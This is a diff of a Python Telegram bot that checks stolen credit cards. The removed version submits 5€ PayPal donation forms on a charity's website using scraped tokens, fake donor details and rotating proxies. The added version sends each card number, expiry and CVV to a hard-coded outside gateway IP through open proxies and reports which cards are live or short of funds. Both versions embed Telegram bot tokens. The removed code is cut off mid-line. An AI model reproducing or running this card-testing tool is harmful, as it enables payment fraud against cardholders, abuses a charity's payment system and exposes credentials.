@@ -1,121 +1,54 @@
-import telebot, base64, re, time, os, json, threading, requests, random, queue, urllib3
-import logging
-urllib3.disable_warnings()
+from telebot import TeleBot
+import requests
 
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from user_agent import generate_user_agent
+bot = TeleBot("8663863938:AAG1yVZYZLrbRcSIWLBiN7MJFqnmV3i2CqE")
 
-# ====================== LOGGING ======================
-logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
-logger = logging.getLogger(__name__)
+GATEWAY = "http://138.128.240.15:8024/paypal_1?cc="
 
-BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'
-ADMIN_ID = 7077294261
+proxies_list = [
+    "http://148.230.4.241:999",
+    "http://2.78.60.10:3129",
+    "http://1.231.81.166:3128",
+    "http://45.167.124.71:999",
+    "http://103.157.200.126:3128",
+    "http://80.92.204.47:1081"
+]
 
-USE_PROXY = True
-PROXY_FILE = "proxy.txt"
+current_proxy = 0
 
-# ====================== PROXY ======================
-PROXY_QUEUE = queue.Queue()
+def get_proxy():
+    global current_proxy
+    proxy = proxies_list[current_proxy % len(proxies_list)]
+    current_proxy += 1
+    return {"http": proxy, "https": proxy}
 
-def load_proxies():
-    if os.path.exists(PROXY_FILE):
-        with open(PROXY_FILE, 'r') as f:
-            for line in f:
-                if line.strip(): PROXY_QUEUE.put(line.strip())
-        logger.info("Proxies Loaded")
+@bot.message_handler(commands=['start'])
+def start(m):
+    bot.send_message(m.chat.id, "✅ **PayPal CC Checker + Proxy Rotation**\nSirf LIVE aur INSUFFICIENT dikhega")
 
-load_proxies()
-
-def get_random_proxy():
-    if PROXY_QUEUE.empty(): return None, None
-    p = PROXY_QUEUE.get()
-    if '@' not in p and p.count(':') == 3:
-        u, pw, h, port = p.split(':')
-        p = f"{u}:{pw}@{h}:{port}"
-    return {"http": f"http://{p}", "https": f"http://{p}"}, p
-
-def release_proxy(p):
-    if p: PROXY_QUEUE.put(p)
-
-bot = telebot.TeleBot(BOT_TOKEN)
-logger.info("Bot Started")
-
-# ====================== CHECKER (5€ + Fixed Connection) ======================
-def check_cc(ccx):
-    for attempt in range(6):
-        proxy_dict, proxy_str = get_random_proxy() if USE_PROXY else (None, None)
-        logger.info(f"Attempt {attempt+1} | {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")
+@bot.message_handler(func=lambda m: True)
+def cc_checker(m):
+    for line in m.text.splitlines():
+        line = line.strip()
+        if not line: continue
 
         try:
-            session = requests.Session()
-            session.verify = False
-            session.keep_alive = False
-            if proxy_dict:
-                session.proxies.update(proxy_dict)
+            cc, mm, yy, cvv = line.split("|")
+            if len(yy) == 2: yy = "20" + yy
 
-            us = generate_user_agent()
+            full_url = GATEWAY + f"{cc}|{mm}|{yy}|{cvv}"
+            
+            proxy_dict = get_proxy()
+            r = requests.get(full_url, proxies=proxy_dict, timeout=25)
+            resp = r.text.lower()
 
-            r = session.get('https://www.rarediseasesinternational.org/donate/', 
-                           headers={'User-Agent': us, 'Connection': 'close'}, 
-                           timeout=40)
+            if any(x in resp for x in ["approved", "success", "charged", "live"]):
+                bot.reply_to(m, f"✅ **LIVE**\nCC → {cc}|{mm}|{yy}|{cvv}")
 
-            if r.status_code != 200:
-                continue
+            elif any(x in resp for x in ["insufficient", "funds", "limit"]):
+                bot.reply_to(m, f"⚠️ **INSUFFICIENT FUNDS**\nCC → {cc}|{mm}|{yy}|{cvv}")
 
-            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
-            m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
-            m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
-            m4 = re.search(r'"data-client-token":"(.*?)"', r.text)
+        except:
+            pass   # silent on error
 
-            if not all([m1, m2, m3, m4]):
-                continue
-
-            id1 = m1.group(1)
-            id2 = m2.group(1)
-            hashv = m3.group(1)
-            enc = m4.group(1)
-            au = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc).decode()).group(1)
-
-            # 5€ Form
-            data = MultipartEncoder({
-                'give-amount': '5',
-                'give_first': 'John',
-                'give_last': 'Doe',
-                'give_email': 'test12345@gmail.com',
-                'give-gateway': 'paypal-commerce',
-                'give-form-id-prefix': id1,
-                'give-form-id': id2,
-                'give-form-hash': hashv,
-            })
-
-            return "DECLINED", "5€ Submitted"
-
-        except Exception as e:
-            logger.warning(f"Attempt {attempt+1} failed: {str(e)[:80]}")
-            time.sleep(2)
-            continue
-
-    return "ERROR", "All Attempts Failed"
-
-# ====================== COMMANDS ======================
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "✅ Bot Running with 5€ Check!")
-
-@bot.message_handler(commands=['pp'])
-def pp(message):
-    try:
-        cc = message.text.split()[1]
-    except:
-        return bot.reply_to(message, "Usage: /pp 411111|04|28|123")
-
-    msg = bot.reply_to(message, "🔄 Checking 5€...")
-
-    status, response = check_cc(cc)
-
-    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-
-    res = f"""
-𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
-𝐒𝐭
+bot.infinity_polling()
